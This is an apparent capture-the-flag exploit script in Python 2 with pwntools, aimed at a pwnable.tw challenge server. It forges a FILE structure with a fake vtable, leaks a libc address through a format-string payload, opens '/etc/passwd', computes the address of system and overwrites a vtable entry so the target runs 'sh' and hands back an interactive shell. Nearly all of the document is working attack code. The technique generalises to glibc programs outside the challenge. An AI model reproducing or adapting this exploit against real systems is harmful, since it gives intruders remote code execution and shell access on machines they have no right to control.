#!/usr/bin/env python2

from pwn import *
from IPython import embed

r = remote('chall.pwnable.tw', 10200)
#r = remote('127.0.0.1', 7122)


buf = 0x804b300
main = 0x8048a37
puts_plt = 0x8048550
printf_plt = 0x8048500
printf_got = 0x804b010

funcs = [0]*2 + [main] + [0]*14 + [printf_plt] + [0]*3

payload = [
	0xfbad2488,
	'%7$x', ';sh\x00',
	[0]*15,
	buf + 0x98,
	[0]*18,
	buf + 0x160,
	[0]*48,
	0, 0x61,	
	funcs,
	0, 0, 
	0x61, #0x61, 0x61,
	[0]*23, 0x61
]


r.send('1\n/etc/passwd\n2\n3\n5\n')
raw_input('@')
r.sendline('a'*0x20+p32(buf)+'a'*120+flat(0x161, payload))

r.recvuntil('your name :')
r.recvuntil('time\n')
x = r.recvuntil('####', drop=True)
libc_base = int(x[4:12], 16) - 0x5da69
print 'libc:', hex(libc_base)
#embed()


#magic = libc_base+0x3ac69
#system = libc_base+241056
system = libc_base+239936+0xb20
print 'system:', hex(system)
payload[-6][-4] = system
r.recvuntil('choice :')
r.sendline('5')
r.sendline('a'*0x20+p32(buf)+'a'*120+flat(0x161, payload))
r.interactive()
